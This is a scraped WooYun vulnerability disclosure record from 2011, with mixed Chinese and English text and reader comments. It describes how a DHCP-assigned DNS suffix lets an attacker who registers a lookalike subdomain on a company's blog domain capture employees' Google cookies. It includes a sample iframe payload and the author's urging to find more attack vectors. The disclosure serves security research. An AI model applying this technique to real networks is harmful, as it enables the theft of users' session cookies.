{"id": 22868, "wybug_id": "wooyun-2011-02113", "wybug_title": "Dns-suffix may lead to cross-domain and other security problems", "wybug_corp": "OS", "wybug_author": "我勒个去", "wybug_date": "2011-05-13 12:03", "wybug_open_date": "2011-05-13 12:06", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-05-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-05-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这种设计会造成一定的安全问题 xp和linux都测试成功 详细说明：  We all know that dhcpd can set the dns suffix for its clients. For example , If we set the dns suffix as \"test.com\". While doing the domain name resolution  such as www.xxx.com , all the client using this dhcp server will try the following order.1. System tries  to look up www.xxx.com  if the dns find a IP addr , the client will go on use this ip. 2. Otherwise , the system will automatically add the dns suffix to have another try(This is partly true cos win7 only add dns suffix to the  dns name doesn't contain a '.' ). This time will be www.xxx.com.test.com  .If the dns return the found addr,  program will happily use this result as its right answer .This did bring some  convenient, but may lead to some problem, for example cross-domain.   漏洞证明：  Scenario ：1.Company A.COM  provide secondary domain registation for their customers ( eg. free blog system) .People can register any username they want, from example  test . Then his space will be test.A.com.  This works fine.2.Company's internal network using a dhcp server which automatically adds an A.COM dns suffix to their client.An attack wanna  gather some employees'  gmail account. He then can easily register a username like hack.www.google.com then the full domain name will be hack.www.google.com.A.comWhen A.com 's employees browser the web site contains a iframe such as <iframe src=\"https://hack.www.google.com/accounts\" >fuck it up</iframe>Employees's  system will 1. try to resolve hack.www.google.com then get a false answer(NX Domain).2.then try hack.www.google.com.A.com will get attacker's host IP addr.!!!But the browser doesn't know this  & will happily send google's  cookies to the attacker's web server.Success on windows XP /Linux Ubuntu 11.04  IE FF Chrome~:)  Failed on win7  cos its only add dns suffix to the  dnsname doesn't contain a '.' GAME OVER!!!  Use your brains and think more potential attack vectors!!    修复方案：  fix lib   版权声明：转载请注明来源 我勒个去@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-05-13 18:17 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  求中文    \n     2011-05-13 22:52 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  略懂略懂    \n     2011-09-30 13:47 |    \t\tsw0rder \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:5        | /*菜菜*/)\t\t \n  还得花钱注册域名 测试这个代价不小啊    \n     2013-01-10 10:29 |    \t\t偶尔透透气 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 常常潜潜水,偶尔透透气.)\t\t \n  现在才发现  你就是个人才...    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}